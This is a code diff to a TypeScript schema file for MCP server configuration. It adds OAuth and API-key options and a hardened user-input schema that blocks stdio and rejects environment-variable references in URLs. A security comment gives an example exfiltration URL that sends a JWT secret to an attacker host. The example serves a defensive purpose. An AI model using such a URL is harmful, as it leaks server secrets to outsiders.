@@ -1,10 +1,26 @@
 import { z } from 'zod';
-import type { TUser } from './types';
+import { TokenExchangeMethodEnum } from './types/agents';
 import { extractEnvVariable } from './utils';
 
 const BaseOptionsSchema = z.object({
+  /** Display name for the MCP server - only letters, numbers, and spaces allowed */
+  title: z
+    .string()
+    .regex(/^[a-zA-Z0-9 ]+$/, 'Title can only contain letters, numbers, and spaces')
+    .optional(),
+  /** Description of the MCP server */
+  description: z.string().optional(),
+  /**
+   * Controls whether the MCP server is initialized during application startup.
+   * - true (default): Server is initialized during app startup and included in app-level connections
+   * - false: Skips initialization at startup and excludes from app-level connections - useful for servers
+   *   requiring manual authentication (e.g., GitHub PAT tokens) that need to be configured through the UI after startup
+   */
+  startup: z.boolean().optional(),
   iconPath: z.string().optional(),
   timeout: z.number().optional(),
+  /** Timeout (ms) for the long-lived SSE GET stream body before undici aborts it. Default: 300_000 (5 min). */
+  sseReadTimeout: z.number().positive().optional(),
   initTimeout: z.number().optional(),
   /** Controls visibility in chat dropdown menu (MCPSelect) */
   chatMenu: z.boolean().optional(),
@@ -15,6 +31,76 @@ const BaseOptionsSchema = z.object({
    * - string: Use custom instructions (overrides server-provided)
    */
   serverInstructions: z.union([z.boolean(), z.string()]).optional(),
+  /**
+   * Whether this server requires OAuth authentication
+   * If not specified, will be auto-detected during construction
+   */
+  requiresOAuth: z.boolean().optional(),
+  /**
+   * OAuth configuration for SSE and Streamable HTTP transports
+   * - Optional: OAuth can be auto-discovered on 401 responses
+   * - Pre-configured values will skip discovery steps
+   */
+  oauth: z
+    .object({
+      /** OAuth authorization endpoint (optional - can be auto-discovered) */
+      authorization_url: z.string().url().optional(),
+      /** OAuth token endpoint (optional - can be auto-discovered) */
+      token_url: z.string().url().optional(),
+      /** OAuth client ID (optional - can use dynamic registration) */
+      client_id: z.string().optional(),
+      /** OAuth client secret (optional - can use dynamic registration) */
+      client_secret: z.string().optional(),
+      /** OAuth scopes to request */
+      scope: z.string().optional(),
+      /** OAuth redirect URI (defaults to /api/mcp/{serverName}/oauth/callback) */
+      redirect_uri: z.string().url().optional(),
+      /** Token exchange method */
+      token_exchange_method: z.nativeEnum(TokenExchangeMethodEnum).optional(),
+      /** Supported grant types (defaults to ['authorization_code', 'refresh_token']) */
+      grant_types_supported: z.array(z.string()).optional(),
+      /** Supported token endpoint authentication methods (defaults to ['client_secret_basic', 'client_secret_post']) */
+      token_endpoint_auth_methods_supported: z.array(z.string()).optional(),
+      /** Supported response types (defaults to ['code']) */
+      response_types_supported: z.array(z.string()).optional(),
+      /** Supported code challenge methods (defaults to ['S256', 'plain']) */
+      code_challenge_methods_supported: z.array(z.string()).optional(),
+      /** Skip code challenge validation and force S256 (useful for providers like AWS Cognito that support S256 but don't advertise it) */
+      skip_code_challenge_check: z.boolean().optional(),
+      /** OAuth revocation endpoint (optional - can be auto-discovered) */
+      revocation_endpoint: z.string().url().optional(),
+      /** OAuth revocation endpoint authentication methods supported (optional - can be auto-discovered) */
+      revocation_endpoint_auth_methods_supported: z.array(z.string()).optional(),
+    })
+    .optional(),
+  /** Custom headers to send with OAuth requests (registration, discovery, token exchange, etc.) */
+  oauth_headers: z.record(z.string(), z.string()).optional(),
+  /**
+   * API Key authentication configuration for SSE and Streamable HTTP transports
+   * - source: 'admin' means the key is provided by admin and shared by all users
+   * - source: 'user' means each user provides their own key via customUserVars
+   */
+  apiKey: z
+    .object({
+      /** API key value (only for admin-provided mode, stored encrypted) */
+      key: z.string().optional(),
+      /** Whether key is provided by admin or each user */
+      source: z.enum(['admin', 'user']),
+      /** How to format the authorization header */
+      authorization_type: z.enum(['basic', 'bearer', 'custom']),
+      /** Custom header name when authorization_type is 'custom' */
+      custom_header: z.string().optional(),
+    })
+    .optional(),
+  customUserVars: z
+    .record(
+      z.string(),
+      z.object({
+        title: z.string(),
+        description: z.string(),
+      }),
+    )
+    .optional(),
 });
 
 export const StdioOptionsSchema = BaseOptionsSchema.extend({
@@ -93,7 +179,7 @@ export const SSEOptionsSchema = BaseOptionsSchema.extend({
 });
 
 export const StreamableHTTPOptionsSchema = BaseOptionsSchema.extend({
-  type: z.literal('streamable-http'),
+  type: z.union([z.literal('streamable-http'), z.literal('http')]),
   headers: z.record(z.string(), z.string()).optional(),
   url: z
     .string()
@@ -122,93 +208,64 @@ export const MCPServersSchema = z.record(z.string(), MCPOptionsSchema);
 export type MCPOptions = z.infer<typeof MCPOptionsSchema>;
 
 /**
- * List of allowed user fields that can be used in MCP environment variables.
- * These are non-sensitive string/boolean fields from the IUser interface.
+ * Helper to omit server-managed fields that should not come from UI
  */
-const ALLOWED_USER_FIELDS = [
-  'name',
-  'username',
-  'email',
-  'provider',
-  'role',
-  'googleId',
-  'facebookId',
-  'openidId',
-  'samlId',
-  'ldapId',
-  'githubId',
-  'discordId',
-  'appleId',
-  'emailVerified',
-  'twoFactorEnabled',
-  'termsAccepted',
-] as const;
+const omitServerManagedFields = <T extends z.ZodObject<z.ZodRawShape>>(schema: T) =>
+  schema.omit({
+    startup: true,
+    timeout: true,
+    sseReadTimeout: true,
+    initTimeout: true,
+    chatMenu: true,
+    serverInstructions: true,
+    requiresOAuth: true,
+    customUserVars: true,
+    oauth_headers: true,
+  });
+
+const envVarPattern = /\$\{[^}]+\}/;
+const isWsProtocol = (val: string): boolean => /^wss?:/i.test(val);
+const isHttpProtocol = (val: string): boolean => /^https?:/i.test(val);
 
 /**
- * Processes a string value to replace user field placeholders
- * @param value - The string value to process
- * @param user - The user object
- * @returns The processed string with placeholders replaced
+ * Builds a URL schema for user input that rejects ${VAR} env variable patterns
+ * and validates protocol constraints without resolving environment variables.
  */
-function processUserPlaceholders(value: string, user?: TUser): string {
-  if (!user || typeof value !== 'string') {
-    return value;
-  }
-
-  for (const field of ALLOWED_USER_FIELDS) {
-    const placeholder = `{{LIBRECHAT_USER_${field.toUpperCase()}}}`;
-    if (value.includes(placeholder)) {
-      const fieldValue = user[field as keyof TUser];
-      const replacementValue = fieldValue != null ? String(fieldValue) : '';
-      value = value.replace(new RegExp(placeholder, 'g'), replacementValue);
-    }
-  }
-
-  return value;
-}
+const userUrlSchema = (protocolCheck: (val: string) => boolean, message: string) =>
+  z
+    .string()
+    .refine((val) => !envVarPattern.test(val), {
+      message: 'Environment variable references are not allowed in URLs',
+    })
+    .pipe(z.string().url())
+    .refine(protocolCheck, { message });
 
 /**
- * Recursively processes an object to replace environment variables in string values
- * @param obj - The object to process
- * @param user - The user object containing all user fields
- * @returns - The processed object with environment variables replaced
+ * MCP Server configuration that comes from UI/API input only.
+ * Omits server-managed fields like startup, timeout, customUserVars, etc.
+ * Allows: title, description, url, iconPath, oauth (user credentials)
+ *
+ * SECURITY: Stdio transport is intentionally excluded from user input.
+ * Stdio allows arbitrary command execution and should only be configured
+ * by administrators via the YAML config file (librechat.yaml).
+ * Only remote transports (SSE, HTTP, WebSocket) are allowed via the API.
+ *
+ * SECURITY: URL fields use userUrlSchema instead of the admin schemas'
+ * extractEnvVariable transform to prevent env variable exfiltration
+ * through user-controlled URLs (e.g. http://attacker.com/?k=${JWT_SECRET}).
+ * Protocol checks use positive allowlists (http(s) / ws(s)) to block
+ * file://, ftp://, javascript:, and other non-network schemes.
  */
-export function processMCPEnv(obj: Readonly<MCPOptions>, user?: TUser): MCPOptions {
-  if (obj === null || obj === undefined) {
-    return obj;
-  }
+export const MCPServerUserInputSchema = z.union([
+  omitServerManagedFields(WebSocketOptionsSchema).extend({
+    url: userUrlSchema(isWsProtocol, 'WebSocket URL must use ws:// or wss://'),
+  }),
+  omitServerManagedFields(SSEOptionsSchema).extend({
+    url: userUrlSchema(isHttpProtocol, 'SSE URL must use http:// or https://'),
+  }),
+  omitServerManagedFields(StreamableHTTPOptionsSchema).extend({
+    url: userUrlSchema(isHttpProtocol, 'Streamable HTTP URL must use http:// or https://'),
+  }),
+]);
 
-  const newObj: MCPOptions = structuredClone(obj);
-
-  if ('env' in newObj && newObj.env) {
-    const processedEnv: Record<string, string> = {};
-    for (const [key, value] of Object.entries(newObj.env)) {
-      let processedValue = extractEnvVariable(value);
-      processedValue = processUserPlaceholders(processedValue, user);
-      processedEnv[key] = processedValue;
-    }
-    newObj.env = processedEnv;
-  } else if ('headers' in newObj && newObj.headers) {
-    const processedHeaders: Record<string, string> = {};
-    for (const [key, value] of Object.entries(newObj.headers)) {
-      const userId = user?.id;
-      if (value === '{{LIBRECHAT_USER_ID}}' && userId != null) {
-        processedHeaders[key] = String(userId);
-        continue;
-      }
-
-      let processedValue = extractEnvVariable(value);
-      processedValue = processUserPlaceholders(processedValue, user);
-      processedHeaders[key] = processedValue;
-    }
-    newObj.headers = processedHeaders;
-  }
-
-  if ('url' in newObj && newObj.url) {
-    let processedUrl = extractEnvVariable(newObj.url);
-    processedUrl = processUserPlaceholders(processedUrl, user);
-    newObj.url = processedUrl;
-  }
-
-  return newObj;
-}
+export type MCPServerUserInput = z.infer<typeof MCPServerUserInputSchema>;
